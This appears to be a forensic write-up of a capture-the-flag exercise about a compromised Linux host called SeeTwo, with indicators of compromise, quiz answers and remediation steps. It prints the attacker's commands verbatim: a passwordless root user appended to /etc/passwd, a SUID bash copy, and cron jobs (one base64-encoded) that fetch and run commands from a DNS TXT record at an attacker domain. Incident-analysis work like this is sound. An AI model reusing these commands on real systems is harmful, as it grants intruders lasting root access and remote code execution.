# SeeTwo Compromise Assessment Report

---

## Quick Summary

A Linux host called **SeeTwo** was investigated after unusual network traffic was spotted between two internal hosts. The investigation confirmed a full system compromise.

An attacker delivered malware through the network, used it to execute commands remotely, escalated to root, and left behind multiple backdoors to maintain access — even if the original malware was removed.

> **Severity: Critical — Host should be considered fully compromised and untrusted.**

---

## What Happened (Plain English)

1. The attacker sent a malicious Python program to the victim machine over HTTP.
2. The program quietly connected back to the attacker's machine and waited for commands.
3. Commands were encrypted (XOR cipher) so they wouldn't look suspicious in traffic.
4. The attacker used this channel to poke around the system, find credentials, and gain root access.
5. Before leaving, they planted **four separate backdoors** to ensure long-term access.

---

## Environment

| Item | Detail |
|---|---|
| System name | SeeTwo |
| Platform | Linux |
| Attacker IP (C2 server) | `10.0.2.64` |
| Victim IP | `10.0.2.71` |
| Malicious port | `1337` |
| Malware type | PyInstaller-packed Python executable |
| Traffic captured | ~15,027 bytes over HTTP/TCP |

---

## How the Malware Worked

The malware was a Python script bundled into an executable using **PyInstaller** (a tool that packages Python programs so they run without Python being installed). It was recovered from the packet capture and reverse-engineered.

**After decompiling the code, the key details were:**

```
C2 Server:  10.0.2.64:1337
XOR Key:    MySup3rXoRKeYForCommandandControl
Separator:  AAAAAAAAAA
```

**Behavior loop:**
1. Connect to the attacker's server
2. Receive an encrypted command
3. Decrypt it using the XOR key
4. Execute it on the system via shell
5. Encrypt the output and send it back

This is essentially a lightweight **remote shell** — the attacker could run any command as if they were sitting at the keyboard.

---

## Step-by-Step Attacker Activity

### Step 1 — Who am I

The attacker ran `id` to check what user they had access as:

```
uid=1000(bella)  gid=1000(bella)
groups: adm, cdrom, sudo, dip, plugdev
```

**Why it matters:** The user `bella` is in the `sudo` group — meaning they can run commands as root. This is the attacker's path to full control.

---

### Step 2 — Digging Through History

The attacker read the user's command history:

```bash
cat /home/bella/.bash_history
```

**Found inside:**

```
mysql -u root -p'vb0xIkSGbcEKBEi'
```

**Why it matters:** A MySQL root password was sitting in plain text in the shell history. This is a credential exposure risk — and potentially useful for further attacks like accessing a database.

---

### Step 3 — Checking Sudo Access

```bash
sudo -l
```

**Output:**
```
User bella may run the following commands on seetwo:
    (ALL : ALL) ALL
```

**Why it matters:** `bella` can run *any* command as *any* user with sudo — no restrictions. The attacker now has a clean path to root.

---

### Step 4 — Root Access Achieved

After escalating privileges, the attacker confirmed root:

```
uid=0(root)  gid=0(root)  groups=0(root)
```

**Why it matters:** At this point, the attacker has complete, unrestricted control of the machine.

---

### Step 5 — Backdoor User Created

```bash
echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd
```

This adds a new user called `toor` directly to the system password file.

| Field | Value | Meaning |
|---|---|---|
| Username | `toor` | Hidden "root" spelled backwards |
| Password | *(empty)* | No password required to log in |
| UID | `0` | Root-level privileges |
| Shell | `/bin/bash` | Full interactive shell |

**Why it matters:** Anyone can now SSH (or log in) as `toor` with no password and get an instant root shell.

---

### Step 6 — SUID Backdoor Executable

```bash
cp /usr/bin/bash /usr/bin/passswd
chmod u+s /usr/bin/passswd
```

The attacker copied the Bash shell, gave it a name that looks like the legitimate `passwd` command (note the triple `s`), and set the **SUID bit**.

```
-rwsr-xr-x  root  root  /usr/bin/passswd
MD5: 23c415748ff840b296d0b93f98649dec
```

**Why it matters:** The SUID bit makes a file run with the *owner's* privileges regardless of who executes it. Since this is owned by root, anyone who runs `/usr/bin/passswd` gets a root shell — no password needed.

---

### Step 7 — Cron Persistence (Root)

Added to root's crontab — runs every minute:

```bash
* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"
```

**What this does:** Every 60 seconds, the system queries a DNS server (`ns.ev1l.thm`) for a TXT record, and executes whatever command is stored there.

**Why it matters:** This is **DNS-based command-and-control**. The attacker can change what gets executed just by updating a DNS record — no need to touch the compromised machine again. It also looks like harmless DNS traffic.

---

### Step 8 — Cron Persistence (User Bella)

Added to bella's crontab:

```bash
* * * * * echo L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMuVEhNe1NlZTJzTmV2M3JHZXRPbGR9LnRobSki | base64 -d | sh
```

This is a Base64-encoded command that, when decoded, runs a similar DNS-based shell command.

**Why it matters:** A second, independent persistence mechanism. If the root cron job is found and removed, this one keeps the attacker in.

---

## All Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Compromised user | `bella` |
| Attacker C2 IP | `10.0.2.64` |
| Victim IP | `10.0.2.71` |
| C2 port | `1337` |
| XOR encryption key | `MySup3rXoRKeYForCommandandControl` |
| Separator in protocol | `AAAAAAAAAA` |
| Malware file | `client.py` (decompiled) |
| Exposed credential | `mysql -u root -p'vb0xIkSGbcEKBEi'` |
| Backdoor user entry | `toor::0:0:root:/root:/bin/bash` |
| SUID backdoor binary | `/usr/bin/passswd` |
| Backdoor MD5 hash | `23c415748ff840b296d0b93f98649dec` |
| DNS C2 domain | `ev1l.thm` |
| DNS C2 nameserver | `ns.ev1l.thm` |

---

## Confirmed Q&A (CTF-Style Answers)

| Question | Answer |
|---|---|
| First file read by attacker | `/home/bella/.bash_history` |
| Contents of that file | `mysql -u root -p'vb0xIkSGbcEKBEi'` |
| Backdoor user added | `toor::0:0:root:/root:/bin/bash` |
| Name of SUID backdoor binary | `/usr/bin/passswd` |
| MD5 hash of backdoor binary | `23c415748ff840b296d0b93f98649dec` |
| First cron job placed | `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"` |

---

## Recommended Remediation Actions

> If this is a real production system, **isolate it from the network immediately** before doing anything else.

**Remove backdoors:**
- Delete the `toor` line from `/etc/passwd`
- Delete `/usr/bin/passswd`
- Clear root's crontab (`/var/spool/cron/crontabs/root`)
- Clear bella's crontab (`/var/spool/cron/crontabs/bella`)

**Rotate credentials:**
- Change the MySQL root password (`vb0xIkSGbcEKBEi`)
- Audit all shell history files for other exposed secrets
- Change bella's account password

**Investigate further:**
- Search for other SUID binaries: `find / -perm -4000 2>/dev/null`
- Review SSH auth logs for attacker logins
- Check for other unknown user accounts
- Look for other files dropped by the attacker

**Block at network level:**
- Block outbound traffic to `10.0.2.64`
- Block DNS queries to `ev1l.thm` and `ns.ev1l.thm`

**Long-term:**
- Rebuild from a known-good image (root-level compromise means the system can never be fully trusted)
- Implement shell history hardening such as avoid storing credentials in commands
- Audit sudo permissions — `(ALL:ALL) ALL` for a normal user is excessively permissive

---

## Key Lessons

The investigation succeeded because of a chain of analysis steps, each unlocking the next:

```
Suspicious traffic -> Export file -> Decode Base64 -> Identify PyInstaller
    -> Extract with pyinstxtractor -> Decompile bytecode -> Recover XOR key
        -> Decrypt C2 traffic -> Reconstruct attacker commands
```

The most critical step was **decompiling the malware** — recovering the XOR key from the source code made the entire encrypted C2 channel readable. Without that, the attacker's activity would have remained hidden.

This case highlights the risk of:
- Sensitive credentials stored in shell history
- Overly permissive sudo rules
- Unmonitored outbound connections on unusual ports (like `1337`)
